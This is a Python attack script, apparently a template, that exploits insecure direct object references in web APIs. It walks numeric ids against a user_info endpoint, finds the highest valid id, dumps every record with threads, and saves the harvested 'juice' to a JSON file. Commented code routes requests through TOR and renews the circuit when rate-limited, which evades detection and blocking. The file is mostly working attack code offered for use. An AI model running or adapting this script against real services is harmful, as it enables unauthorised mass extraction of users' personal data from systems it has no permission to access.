#!/usr/bin/env python3


from dore import *
from time import sleep


def save(juice, filename='out_dontAdd_.json'):
    """
    After you get the juice out, its now your choice to do stuff with it

    Hence, This function is not on `dore` :p
    """
    with open(filename, 'w') as json_file:
        json.dump(
                    juice,
                    json_file,
                    indent=2,
                    sort_keys=True
                )


def exploit(_id):
    """
    Make sure one parameter is set to pass id
    You may use `match` function :)

    If your negative response is matched, then make sure this snippet returns `None` object
    """

    url = 'vulnerable.domain/api'
    url = 'http://127.0.0.1:3117/user_info'

    params = {
                'id': _id
            }
    
    resp = request(  # This is wrapper to `requests.request` with local TOR proxy by default, and other few misc. stuff
        url,
        params=params,
        local=True  # This is when, you don't wanna use TOR/proxies
    )

    if not match('resp_code', resp, 404):
        return resp.json()

    """
    if not match('json', resp, {'err': 'does not exist'}):
        return resp.json()
    elif match('resp_code', resp, 429):  # Got rate limited, here..
        renew()
        return exploit(_id)
    """


    """
    ## Other simple examples of response matching ##

    if not match('json', resp, ['err']):
        return resp.json()

    if not match('regex', resp, '"err"'):
        return resp.json()

    if not match('regex', resp, 'does not exist'):
        return resp.json()

    if not match('resp_code', resp, 404):
        return resp.json()
    """


if __name__ == '__main__':
    
    print(info(f'Started [at] -> {fetchFormatedTime()}'))

    """
    if not is_root():  # You need to be root, for sending a HUP signal to tor
        print(info('Yoo -> `renew()` will not work..'))

    # Start TOR, if not started yet..
    is_active(
                'tor.service',
                start=True
            )
    """
    
    filename = 'juice_dontAdd_.json'

    min_id = 1
    max_id = get_max_id(exploit, iid=min_id, verbose=0)
    # print(max_id)
    clear_line()

    print(info(f'Now -> Dumping the whole thing from `{min_id}` to `{max_id}`'))
    juice = dump_all(exploit, min_id, max_id, threads=2)
    clear_line()

    # min_id = 70
    # max_id = get_max_id(exploit, iid=min_id)
    # clear_line()

    # print(info(f'Again -> Dumping from second id range ( {min_id} to {max_id} ) now..'))
    # juice = dump_all(exploit, min_id, max_id, threads=40)
    # clear_line()
    print(info(f'Done -> Now, saving it to `{filename}`'))
    save(juice, filename)

    coolExit()
